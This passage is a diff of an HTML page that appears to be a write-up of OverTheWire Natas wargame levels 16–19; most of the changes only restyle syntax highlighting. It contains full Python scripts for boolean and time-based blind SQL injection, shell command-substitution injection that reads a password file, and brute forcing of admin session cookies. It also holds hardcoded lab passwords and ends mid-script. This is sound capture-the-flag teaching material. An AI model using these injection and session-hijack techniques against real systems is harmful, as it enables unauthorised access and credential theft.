+        password_guess = <span style="color:#a31515">&#34;&#34;</span>.join([password, char, <span style="color:#a31515">&#34;%&#34;</span>])
+        text = get_page_text({
+            <span style="color:#a31515">&#34;username&#34;</span>:
+                <span style="color:#a31515">&#39;natas16&#34; AND password LIKE BINARY &#34;{0}&#39;</span>.format(password_guess),
+            <span style="color:#a31515">&#34;debug&#34;</span>: <span style="color:#a31515">&#34;true&#34;</span>
         })
-        <span style="color:#007020;font-weight:bold">if</span> does_user_exist(text):
-            password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, char])
-            logging<span style="color:#666">.</span>info(<span style="color:#4070a0">&#34;password: </span><span style="color:#70a0d0;font-style:italic">%s</span><span style="color:#4070a0">&#34;</span>, password)
-            index <span style="color:#666">=</span> <span style="color:#40a070">0</span>
+        <span style="color:#00f">if</span> does_user_exist(text):
+            password = <span style="color:#a31515">&#34;&#34;</span>.join([password, char])
+            logging.info(<span style="color:#a31515">&#34;password: </span><span style="color:#a31515">%s</span><span style="color:#a31515">&#34;</span>, password)
+            index = 0
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">main</span>():
-    <span style="color:#007020;font-weight:bold">print</span> get_password()
+<span style="color:#00f">def</span> main():
+    <span style="color:#00f">print</span> get_password()
 
 
-<span style="color:#007020;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#4070a0">&#34;__main__&#34;</span>:
+<span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
     main()</code></pre></div>
 <p>Running the script prints out the password.</p>
 
@@ -421,7 +421,7 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 from levels <a href="#10">10</a> and <a href="#11">11</a>, but it returns an error if any of the
 characters <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>`</code>, <code>\</code>, <code>'</code>, and <code>&quot;</code>. are used. We can, however,
 make use of shell varible expansions:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">grep -i <span style="color:#4070a0">&#34;</span><span style="color:#007020;font-weight:bold">$(</span>grep -E ^a.* /etc/natas_webpass/natas17<span style="color:#007020;font-weight:bold">)</span><span style="color:#4070a0">aprils&#34;</span> dictionary.txt</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">grep -i <span style="color:#a31515">&#34;</span><span style="color:#00f">$(</span>grep -E ^a.* /etc/natas_webpass/natas17<span style="color:#00f">)</span><span style="color:#a31515">aprils&#34;</span> dictionary.txt</code></pre></div>
 <p>If the password doesn&rsquo;t start with the letter &lsquo;a&rsquo;, the grep inside the variable
 expansion returns nothing, and the outer grep searches for &lsquo;aprils&rsquo;, which it
 finds in dictionary.txt. If however, the password does start with &lsquo;a&rsquo;, the grep
@@ -431,78 +431,78 @@ find, so will return nothing. We can repeat this process for all letters as
 before.</p>
 
 <p>The code to do this is very similar to the code from level <a href="#16">16</a>:</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">string</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">sys</span>
+<span style="color:#00f">import</span> logging
+<span style="color:#00f">import</span> string
+<span style="color:#00f">import</span> sys
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
-<span style="color:#007020;font-weight:bold">from</span> <span style="color:#0e84b5;font-weight:bold">bs4</span> <span style="color:#007020;font-weight:bold">import</span> BeautifulSoup
-
-
-logging<span style="color:#666">.</span>basicConfig(level<span style="color:#666">=</span>logging<span style="color:#666">.</span>DEBUG, stream<span style="color:#666">=</span>sys<span style="color:#666">.</span>stderr)
-logger <span style="color:#666">=</span> logging<span style="color:#666">.</span>getLogger(__name__)
-<span style="color:#60a0b0;font-style:italic"># Silence noisy urllib3 debug logs</span>
-logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#34;urllib3&#34;</span>)<span style="color:#666">.</span>setLevel(logging<span style="color:#666">.</span>CRITICAL)
+<span style="color:#00f">import</span> requests
+<span style="color:#00f">from</span> bs4 <span style="color:#00f">import</span> BeautifulSoup
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_page_text</span>(query_dict):
-    query_dict[<span style="color:#4070a0">&#34;debug&#34;</span>] <span style="color:#666">=</span> <span style="color:#4070a0">&#34;1&#34;</span>
-    r <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(
-        <span style="color:#4070a0">&#34;http://natas16.natas.labs.overthewire.org&#34;</span>,
-        auth<span style="color:#666">=</span>(<span style="color:#4070a0">&#34;natas16&#34;</span>, <span style="color:#4070a0">&#34;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#34;</span>),
-        params<span style="color:#666">=</span>query_dict)
-    <span style="color:#007020;font-weight:bold">return</span> r<span style="color:#666">.</span>text
+logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
+logger = logging.getLogger(__name__)
+<span style="color:#008000"># Silence noisy urllib3 debug logs</span>
+logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel(logging.CRITICAL)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">does_user_exist</span>(body):
-    html <span style="color:#666">=</span> BeautifulSoup(body, <span style="color:#4070a0">&#34;html.parser&#34;</span>)
-    text <span style="color:#666">=</span> html<span style="color:#666">.</span>body<span style="color:#666">.</span>div<span style="color:#666">.</span>pre<span style="color:#666">.</span>get_text()<span style="color:#666">.</span>strip()
-    logger<span style="color:#666">.</span>debug(text)
-    <span style="color:#007020;font-weight:bold">return</span> text <span style="color:#666">!=</span> <span style="color:#4070a0">&#34;Aprils&#34;</span>
+<span style="color:#00f">def</span> get_page_text(query_dict):
+    query_dict[<span style="color:#a31515">&#34;debug&#34;</span>] = <span style="color:#a31515">&#34;1&#34;</span>
+    r = requests.get(
+        <span style="color:#a31515">&#34;http://natas16.natas.labs.overthewire.org&#34;</span>,
+        auth=(<span style="color:#a31515">&#34;natas16&#34;</span>, <span style="color:#a31515">&#34;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#34;</span>),
+        params=query_dict)
+    <span style="color:#00f">return</span> r.text
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_next_char</span>(index, possible_chars):
-    next_index <span style="color:#666">=</span> index <span style="color:#666">+</span> <span style="color:#40a070">1</span>
-    <span style="color:#007020;font-weight:bold">return</span> next_index, possible_chars[index]
+<span style="color:#00f">def</span> does_user_exist(body):
+    html = BeautifulSoup(body, <span style="color:#a31515">&#34;html.parser&#34;</span>)
+    text = html.body.div.pre.get_text().strip()
+    logger.debug(text)
+    <span style="color:#00f">return</span> text != <span style="color:#a31515">&#34;Aprils&#34;</span>
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_password</span>():
-    <span style="color:#60a0b0;font-style:italic"># All previous passwords contined only numbers and lower/upper case</span>
-    <span style="color:#60a0b0;font-style:italic"># letters. Let&#39;s assume that the same is true for this password.</span>
-    possible_chars <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([
-        string<span style="color:#666">.</span>lowercase,
-        string<span style="color:#666">.</span>uppercase,
-        <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join(<span style="color:#007020">map</span>(<span style="color:#007020">str</span>, <span style="color:#007020">range</span>(<span style="color:#40a070">10</span>)))
+<span style="color:#00f">def</span> get_next_char(index, possible_chars):
+    next_index = index + 1
+    <span style="color:#00f">return</span> next_index, possible_chars[index]
+
+
+<span style="color:#00f">def</span> get_password():
+    <span style="color:#008000"># All previous passwords contined only numbers and lower/upper case</span>
+    <span style="color:#008000"># letters. Let&#39;s assume that the same is true for this password.</span>
+    possible_chars = <span style="color:#a31515">&#34;&#34;</span>.join([
+        string.lowercase,
+        string.uppercase,
+        <span style="color:#a31515">&#34;&#34;</span>.join(map(str, range(10)))
     ])
 
-    password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span>
-    index <span style="color:#666">=</span> <span style="color:#40a070">0</span>
-    <span style="color:#007020;font-weight:bold">while</span> True:
-        <span style="color:#007020;font-weight:bold">try</span>:
-            index, char <span style="color:#666">=</span> get_next_char(index, possible_chars)
-        <span style="color:#007020;font-weight:bold">except</span> <span style="color:#007020">IndexError</span>:
-            <span style="color:#60a0b0;font-style:italic"># None of the chars matched, assume that the password has been</span>
-            <span style="color:#60a0b0;font-style:italic"># guessed.</span>
-            <span style="color:#007020;font-weight:bold">return</span> password
-        password_guess <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, char])
-        text <span style="color:#666">=</span> get_page_text({
-            <span style="color:#4070a0">&#34;needle&#34;</span>: <span style="color:#4070a0">&#34;$(grep -E ^{0}.* /etc/natas_webpass/natas17)aprils&#34;</span><span style="color:#666">.</span>format(
+    password = <span style="color:#a31515">&#34;&#34;</span>
+    index = 0
+    <span style="color:#00f">while</span> True:
+        <span style="color:#00f">try</span>:
+            index, char = get_next_char(index, possible_chars)
+        <span style="color:#00f">except</span> IndexError:
+            <span style="color:#008000"># None of the chars matched, assume that the password has been</span>
+            <span style="color:#008000"># guessed.</span>
+            <span style="color:#00f">return</span> password
+        password_guess = <span style="color:#a31515">&#34;&#34;</span>.join([password, char])
+        text = get_page_text({
+            <span style="color:#a31515">&#34;needle&#34;</span>: <span style="color:#a31515">&#34;$(grep -E ^{0}.* /etc/natas_webpass/natas17)aprils&#34;</span>.format(
                 password_guess),
-            <span style="color:#4070a0">&#34;debug&#34;</span>: <span style="color:#4070a0">&#34;true&#34;</span>
+            <span style="color:#a31515">&#34;debug&#34;</span>: <span style="color:#a31515">&#34;true&#34;</span>
         })
-        <span style="color:#007020;font-weight:bold">if</span> does_user_exist(text):
-            password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, char])
-            logging<span style="color:#666">.</span>info(<span style="color:#4070a0">&#34;password: </span><span style="color:#70a0d0;font-style:italic">%s</span><span style="color:#4070a0">&#34;</span>, password)
-            index <span style="color:#666">=</span> <span style="color:#40a070">0</span>
+        <span style="color:#00f">if</span> does_user_exist(text):
+            password = <span style="color:#a31515">&#34;&#34;</span>.join([password, char])
+            logging.info(<span style="color:#a31515">&#34;password: </span><span style="color:#a31515">%s</span><span style="color:#a31515">&#34;</span>, password)
+            index = 0
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">main</span>():
-    <span style="color:#007020;font-weight:bold">print</span> get_password()
+<span style="color:#00f">def</span> main():
+    <span style="color:#00f">print</span> get_password()
 
 
-<span style="color:#007020;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#4070a0">&#34;__main__&#34;</span>:
+<span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
     main()</code></pre></div>
 <p>This returns the password.</p>
 
@@ -512,74 +512,74 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 
 <p>This level is similar to <a href="#16">16</a>, except this time no data is printed out if a
 query returns data or not. We can solve this with a timed blind SQL injection.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#007020;font-weight:bold">SELECT</span> <span style="color:#666">*</span> <span style="color:#007020;font-weight:bold">from</span> USERS <span style="color:#007020;font-weight:bold">where</span> username<span style="color:#666">=</span><span style="color:#4070a0">&#34;natas18&#34;</span>
-<span style="color:#007020;font-weight:bold">AND</span> <span style="color:#007020;font-weight:bold">IF</span>(password <span style="color:#007020;font-weight:bold">LIKE</span> <span style="color:#007020">BINARY</span> <span style="color:#4070a0">&#34;a%&#34;</span>, SLEEP(<span style="color:#40a070">2</span>), <span style="color:#40a070">0</span>)</code></pre></div>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00f">SELECT</span> * <span style="color:#00f">from</span> USERS <span style="color:#00f">where</span> username=<span style="color:#a31515">&#34;natas18&#34;</span>
+<span style="color:#00f">AND</span> <span style="color:#00f">IF</span>(password <span style="color:#00f">LIKE</span> BINARY <span style="color:#a31515">&#34;a%&#34;</span>, SLEEP(2), 0)</code></pre></div>
 <p>This query checks if user <code>natas18</code>&rsquo;s password starts with the letter &lsquo;a&rsquo;. If it
 does, then sleep for two seconds, else do nothing. By timing the requests, we
 can tell if we have a match.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">string</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">sys</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">time</span>
+<span style="color:#00f">import</span> logging
+<span style="color:#00f">import</span> string
+<span style="color:#00f">import</span> sys
+<span style="color:#00f">import</span> time
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
-<span style="color:#007020;font-weight:bold">from</span> <span style="color:#0e84b5;font-weight:bold">bs4</span> <span style="color:#007020;font-weight:bold">import</span> BeautifulSoup
-
-
-logging<span style="color:#666">.</span>basicConfig(level<span style="color:#666">=</span>logging<span style="color:#666">.</span>DEBUG, stream<span style="color:#666">=</span>sys<span style="color:#666">.</span>stderr)
-logger <span style="color:#666">=</span> logging<span style="color:#666">.</span>getLogger(__name__)
-<span style="color:#60a0b0;font-style:italic"># Silence noisy urllib3 debug logs</span>
-logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#34;urllib3&#34;</span>)<span style="color:#666">.</span>setLevel(logging<span style="color:#666">.</span>CRITICAL)
+<span style="color:#00f">import</span> requests
+<span style="color:#00f">from</span> bs4 <span style="color:#00f">import</span> BeautifulSoup
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">time_get_page</span>(query_dict):
-    logger<span style="color:#666">.</span>debug(<span style="color:#4070a0">&#34;running: {0}&#34;</span><span style="color:#666">.</span>format(query_dict[<span style="color:#4070a0">&#34;username&#34;</span>]))
-    query_dict[<span style="color:#4070a0">&#34;debug&#34;</span>] <span style="color:#666">=</span> <span style="color:#4070a0">&#34;1&#34;</span>
-    start <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
-    r <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(
-        <span style="color:#4070a0">&#34;http://natas17.natas.labs.overthewire.org&#34;</span>,
-        auth<span style="color:#666">=</span>(<span style="color:#4070a0">&#34;natas17&#34;</span>, <span style="color:#4070a0">&#34;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#34;</span>),
-        params<span style="color:#666">=</span>query_dict)
-    end <span style="color:#666">=</span> time<span style="color:#666">.</span>time()
-    elapsed <span style="color:#666">=</span> end <span style="color:#666">-</span> start
-    <span style="color:#007020;font-weight:bold">return</span> elapsed
+logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
+logger = logging.getLogger(__name__)
+<span style="color:#008000"># Silence noisy urllib3 debug logs</span>
+logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel(logging.CRITICAL)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_password</span>():
-    <span style="color:#60a0b0;font-style:italic"># All previous passwords contined only numbers and lower/upper case</span>
-    <span style="color:#60a0b0;font-style:italic"># letters. Let&#39;s assume that the same is true for this password.</span>
-    possible_chars <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([
-        string<span style="color:#666">.</span>lowercase,
-        string<span style="color:#666">.</span>uppercase,
-        <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join(<span style="color:#007020">map</span>(<span style="color:#007020">str</span>, <span style="color:#007020">range</span>(<span style="color:#40a070">10</span>)))
+<span style="color:#00f">def</span> time_get_page(query_dict):
+    logger.debug(<span style="color:#a31515">&#34;running: {0}&#34;</span>.format(query_dict[<span style="color:#a31515">&#34;username&#34;</span>]))
+    query_dict[<span style="color:#a31515">&#34;debug&#34;</span>] = <span style="color:#a31515">&#34;1&#34;</span>
+    start = time.time()
+    r = requests.get(
+        <span style="color:#a31515">&#34;http://natas17.natas.labs.overthewire.org&#34;</span>,
+        auth=(<span style="color:#a31515">&#34;natas17&#34;</span>, <span style="color:#a31515">&#34;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#34;</span>),
+        params=query_dict)
+    end = time.time()
+    elapsed = end - start
+    <span style="color:#00f">return</span> elapsed
+
+
+<span style="color:#00f">def</span> get_password():
+    <span style="color:#008000"># All previous passwords contined only numbers and lower/upper case</span>
+    <span style="color:#008000"># letters. Let&#39;s assume that the same is true for this password.</span>
+    possible_chars = <span style="color:#a31515">&#34;&#34;</span>.join([
+        string.lowercase,
+        string.uppercase,
+        <span style="color:#a31515">&#34;&#34;</span>.join(map(str, range(10)))
     ])
 
-    password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span>
-    index <span style="color:#666">=</span> <span style="color:#40a070">0</span>
-    <span style="color:#007020;font-weight:bold">while</span> True:
-        <span style="color:#007020;font-weight:bold">if</span> <span style="color:#007020">len</span>(password) <span style="color:#666">==</span> <span style="color:#40a070">32</span>:
-            <span style="color:#007020;font-weight:bold">return</span> password
-        sql_query <span style="color:#666">=</span> \
-            <span style="color:#4070a0">&#39;natas18&#34; AND IF(password LIKE BINARY &#34;{0}&#34;, SLEEP(2), 0) #&#39;</span>
-        password_times <span style="color:#666">=</span> {
+    password = <span style="color:#a31515">&#34;&#34;</span>
+    index = 0
+    <span style="color:#00f">while</span> True:
+        <span style="color:#00f">if</span> len(password) == 32:
+            <span style="color:#00f">return</span> password
+        sql_query = \
+            <span style="color:#a31515">&#39;natas18&#34; AND IF(password LIKE BINARY &#34;{0}&#34;, SLEEP(2), 0) #&#39;</span>
+        password_times = {
             time_get_page({
-                <span style="color:#4070a0">&#34;username&#34;</span>: sql_query<span style="color:#666">.</span>format(<span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, char, <span style="color:#4070a0">&#34;%&#34;</span>])),
-                <span style="color:#4070a0">&#34;debug&#34;</span>: <span style="color:#4070a0">&#34;true&#34;</span>
+                <span style="color:#a31515">&#34;username&#34;</span>: sql_query.format(<span style="color:#a31515">&#34;&#34;</span>.join([password, char, <span style="color:#a31515">&#34;%&#34;</span>])),
+                <span style="color:#a31515">&#34;debug&#34;</span>: <span style="color:#a31515">&#34;true&#34;</span>
             }): char
-            <span style="color:#007020;font-weight:bold">for</span> char <span style="color:#007020;font-weight:bold">in</span> possible_chars
+            <span style="color:#00f">for</span> char <span style="color:#00f">in</span> possible_chars
         }
-        longest_time <span style="color:#666">=</span> <span style="color:#007020">max</span>(password_times)
-        password <span style="color:#666">=</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join([password, password_times[longest_time]])
-        logging<span style="color:#666">.</span>info(<span style="color:#4070a0">&#34;password: </span><span style="color:#70a0d0;font-style:italic">%s</span><span style="color:#4070a0">&#34;</span>, password)
+        longest_time = max(password_times)
+        password = <span style="color:#a31515">&#34;&#34;</span>.join([password, password_times[longest_time]])
+        logging.info(<span style="color:#a31515">&#34;password: </span><span style="color:#a31515">%s</span><span style="color:#a31515">&#34;</span>, password)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">main</span>():
-    <span style="color:#007020;font-weight:bold">print</span> get_password()
+<span style="color:#00f">def</span> main():
+    <span style="color:#00f">print</span> get_password()
 
 
-<span style="color:#007020;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#4070a0">&#34;__main__&#34;</span>:
+<span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
     main()</code></pre></div>
 <p>The password is:</p>
 
@@ -594,38 +594,38 @@ logged in by setting the <code>PHPSESSID</code> cookie to the session id of an a
 account. We don&rsquo;t know the admin session number, but we can brute force it by
 trying out session numbers. A comment in the code says that there are only a 640
 possible sessions.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">sys</span>
+<span style="color:#00f">import</span> logging
+<span style="color:#00f">import</span> sys
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">concurrent.futures</span>
-
-
-logging<span style="color:#666">.</span>basicConfig(level<span style="color:#666">=</span>logging<span style="color:#666">.</span>INFO, stream<span style="color:#666">=</span>sys<span style="color:#666">.</span>stderr)
-logger <span style="color:#666">=</span> logging<span style="color:#666">.</span>getLogger(__name__)
-<span style="color:#60a0b0;font-style:italic"># Silence noisy urllib3 debug logs</span>
-logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#34;urllib3&#34;</span>)<span style="color:#666">.</span>setLevel(logging<span style="color:#666">.</span>CRITICAL)
+<span style="color:#00f">import</span> requests
+<span style="color:#00f">import</span> concurrent.futures
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_page_text</span>(session_num):
-    logger<span style="color:#666">.</span>debug(session_num)
-    r <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(
-        <span style="color:#4070a0">&#34;http://natas18.natas.labs.overthewire.org&#34;</span>,
-        auth<span style="color:#666">=</span>(<span style="color:#4070a0">&#34;natas18&#34;</span>, <span style="color:#4070a0">&#34;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#34;</span>),
-        cookies<span style="color:#666">=</span>{<span style="color:#4070a0">&#34;PHPSESSID&#34;</span>: <span style="color:#007020">str</span>(session_num)})
-    <span style="color:#007020;font-weight:bold">if</span> <span style="color:#4070a0">&#34;You are an admin.&#34;</span> <span style="color:#007020;font-weight:bold">in</span> r<span style="color:#666">.</span>text:
-        logger<span style="color:#666">.</span>info(<span style="color:#4070a0">&#34;Admin session: </span><span style="color:#70a0d0;font-style:italic">%d</span><span style="color:#4070a0">&#34;</span>, session_num)
-        <span style="color:#007020;font-weight:bold">print</span> r<span style="color:#666">.</span>text
+logging.basicConfig(level=logging.INFO, stream=sys.stderr)
+logger = logging.getLogger(__name__)
+<span style="color:#008000"># Silence noisy urllib3 debug logs</span>
+logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel(logging.CRITICAL)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">main</span>():
-    <span style="color:#007020;font-weight:bold">with</span> concurrent<span style="color:#666">.</span>futures<span style="color:#666">.</span>ThreadPoolExecutor(max_workers<span style="color:#666">=</span><span style="color:#40a070">30</span>) <span style="color:#007020;font-weight:bold">as</span> executor:
-        executor<span style="color:#666">.</span>map(get_page_text, <span style="color:#007020">range</span>(<span style="color:#40a070">640</span>))
+<span style="color:#00f">def</span> get_page_text(session_num):
+    logger.debug(session_num)
+    r = requests.get(
+        <span style="color:#a31515">&#34;http://natas18.natas.labs.overthewire.org&#34;</span>,
+        auth=(<span style="color:#a31515">&#34;natas18&#34;</span>, <span style="color:#a31515">&#34;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#34;</span>),
+        cookies={<span style="color:#a31515">&#34;PHPSESSID&#34;</span>: str(session_num)})
+    <span style="color:#00f">if</span> <span style="color:#a31515">&#34;You are an admin.&#34;</span> <span style="color:#00f">in</span> r.text:
+        logger.info(<span style="color:#a31515">&#34;Admin session: </span><span style="color:#a31515">%d</span><span style="color:#a31515">&#34;</span>, session_num)
+        <span style="color:#00f">print</span> r.text
 
 
-<span style="color:#007020;font-weight:bold">if</span> __name__ <span style="color:#666">==</span> <span style="color:#4070a0">&#34;__main__&#34;</span>:
+<span style="color:#00f">def</span> main():
+    <span style="color:#00f">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=30) <span style="color:#00f">as</span> executor:
+        executor.map(get_page_text, range(640))
+
+
+<span style="color:#00f">if</span> __name__ == <span style="color:#a31515">&#34;__main__&#34;</span>:
     main()</code></pre></div>
 <p>This code makes use of concurrency to speed up execution.</p>
 
@@ -639,46 +639,46 @@ logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#
 in a few times, we notice that the cookie is a hex-encoded string
 <code>&lt;session number&gt;-&lt;username&gt;</code>. Using this information, we can brute force the
 problem as before.</p>
-<div class="highlight"><pre style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#60a0b0;font-style:italic"># -*- coding: utf-8 -*-</span>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000"># -*- coding: utf-8 -*-</span>
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">logging</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">sys</span>
+<span style="color:#00f">import</span> logging
+<span style="color:#00f">import</span> sys
 
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">requests</span>
-<span style="color:#007020;font-weight:bold">import</span> <span style="color:#0e84b5;font-weight:bold">concurrent.futures</span>
-
-
-logging<span style="color:#666">.</span>basicConfig(level<span style="color:#666">=</span>logging<span style="color:#666">.</span>INFO, stream<span style="color:#666">=</span>sys<span style="color:#666">.</span>stderr)
-logger <span style="color:#666">=</span> logging<span style="color:#666">.</span>getLogger(__name__)
-<span style="color:#60a0b0;font-style:italic"># Silence noisy urllib3 debug logs</span>
-logging<span style="color:#666">.</span>getLogger(<span style="color:#4070a0">&#34;urllib3&#34;</span>)<span style="color:#666">.</span>setLevel(logging<span style="color:#666">.</span>CRITICAL)
+<span style="color:#00f">import</span> requests
+<span style="color:#00f">import</span> concurrent.futures
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">str_to_hex</span>(string):
-    char_codes <span style="color:#666">=</span> [<span style="color:#007020">ord</span>(c) <span style="color:#007020;font-weight:bold">for</span> c <span style="color:#007020;font-weight:bold">in</span> string]
-    hex_codes <span style="color:#666">=</span> [<span style="color:#007020">hex</span>(c) <span style="color:#007020;font-weight:bold">for</span> c <span style="color:#007020;font-weight:bold">in</span> char_codes]
-    clean_hex_codes <span style="color:#666">=</span> [h<span style="color:#666">.</span>split(<span style="color:#4070a0">&#34;0x&#34;</span>)[<span style="color:#40a070">1</span>] <span style="color:#007020;font-weight:bold">for</span> h <span style="color:#007020;font-weight:bold">in</span> hex_codes]
-    <span style="color:#007020;font-weight:bold">return</span> <span style="color:#4070a0">&#34;&#34;</span><span style="color:#666">.</span>join(clean_hex_codes)
+logging.basicConfig(level=logging.INFO, stream=sys.stderr)
+logger = logging.getLogger(__name__)
+<span style="color:#008000"># Silence noisy urllib3 debug logs</span>
+logging.getLogger(<span style="color:#a31515">&#34;urllib3&#34;</span>).setLevel(logging.CRITICAL)
 
 
-<span style="color:#007020;font-weight:bold">def</span> <span style="color:#06287e">get_page_text</span>(session_num):
-    logger<span style="color:#666">.</span>debug(session_num)
-    encoded_session_num <span style="color:#666">=</span> str_to_hex(<span style="color:#4070a0">&#34;-&#34;</span><span style="color:#666">.</span>join([<span style="color:#007020">str</span>(session_num), <span style="color:#4070a0">&#34;admin&#34;</span>]))
-    r <span style="color:#666">=</span> requests<span style="color:#666">.</span>get(
-        <span style="color:#4070a0">&#34;http://natas19.natas.labs.overthewire.org&#34;</span>,
-        auth<span style="color:#666">=</span>(<span style="color:#4070a0">&#34;natas19&#34;</span>, <span style="color:#4070a0">&#34;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#34;</span>),
-        cookies<span style="color:#666">=</span>{<span style="color:#4070a0">&#34;PHPSESSID&#34;</span>: <span style="color:#007020">str</span>(encoded_session_num)})
